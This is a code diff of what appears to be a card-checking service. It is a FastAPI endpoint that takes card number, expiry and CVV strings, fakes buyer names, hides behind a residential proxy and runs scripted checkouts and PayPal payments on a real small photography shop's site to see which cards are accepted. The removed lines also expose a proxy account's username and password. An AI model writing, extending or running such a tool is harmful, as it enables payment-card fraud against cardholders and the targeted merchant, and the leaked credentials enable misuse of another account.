@@ -3,17 +3,21 @@ from pydantic import BaseModel
 import requests
 from faker import Faker
 from typing import Tuple
-import uvicorn
+import os
+from dotenv import load_dotenv
+
+# Cargar variables de entorno
+load_dotenv()
 
 app = FastAPI()
 
-# Pydantic model for request validation
+# Modelo Pydantic para validar la entrada
 class CardDetails(BaseModel):
-    ccsa: str  # Format: card_number|month|year|cvv or card_number:month:year:cvv
+    ccsa: str  # Formato: card_number|month|year|cvv o card_number:month:year:cvv
 
 def process_payment(ccsa: str) -> Tuple[str, str]:
     try:
-        # Parse card details
+        # Parsear detalles de la tarjeta
         if '|' in ccsa:
             expl = ccsa.strip().split('|')
         elif ':' in ccsa:
@@ -29,16 +33,18 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
         nombre = fake.first_name().lower()
         last = fake.last_name().lower()
 
-        # Proxy setup
-        username = "geonode_rPnKX90jVA"
-        password = "4f23e1c3-3338-4426-8352-10cea0dc5caf"
-        GEONODE_DNS = "premium-residential.geonode.com:9000"
+        # Configuración del proxy desde variables de entorno
+        username = os.getenv("GEONODE_USERNAME")
+        password = os.getenv("GEONODE_PASSWORD")
+        GEONODE_DNS = os.getenv("GEONODE_DNS")
+        if not all([username, password, GEONODE_DNS]):
+            return 'Declined! ❌', 'MISSING_PROXY_CONFIG'
         proxies = {"http": f"http://{username}:{password}@{GEONODE_DNS}"}
         
         session = requests.Session()
         session.proxies = proxies
 
-        # Step 1: Initial GET request
+        # Paso 1: Solicitud GET inicial
         headers = {
             'authority': 'lschroederphoto.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -57,7 +63,7 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
         params = {'id': '235'}
         session.get('https://lschroederphoto.com/shop/buy.php', params=params, headers=headers)
 
-        # Step 2: Add to cart
+        # Paso 2: Agregar al carrito
         headers = {
             'authority': 'lschroederphoto.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -85,7 +91,7 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
         }
         session.post('https://lschroederphoto.com/shop/buy.php', params=params, headers=headers, data=data)
 
-        # Step 3: Checkout
+        # Paso 3: Checkout
         headers = {
             'authority': 'lschroederphoto.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -114,7 +120,7 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
         }
         session.post('https://lschroederphoto.com/shop/checkout.php', headers=headers, data=data)
 
-        # Step 4: Submit checkout details
+        # Paso 4: Enviar detalles de checkout
         headers = {
             'authority': 'lschroederphoto.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -153,7 +159,7 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
         }
         checkout = session.post('https://lschroederphoto.com/shop/checkout.php', headers=headers, data=data)
 
-        # Step 5: Create order
+        # Paso 5: Crear orden
         headers = {
             'authority': 'lschroederphoto.com',
             'accept': '*/*',
@@ -200,7 +206,7 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
         else:
             return 'Declined! ❌', 'CARD_GENERIC_ERROR'
 
-        # Step 6: PayPal payment
+        # Paso 6: Pago con PayPal
         headers = {
             'authority': 'www.paypal.com',
             'accept': '*/*',
@@ -315,6 +321,3 @@ def process_payment(ccsa: str) -> Tuple[str, str]:
 async def process_payment_endpoint(card_details: CardDetails):
     status, code = process_payment(card_details.ccsa)
     return {"status": status, "code": code}
-
-if __name__ == "__main__":
-    uvicorn.run(app, host="0.0.0.0", port=8000)
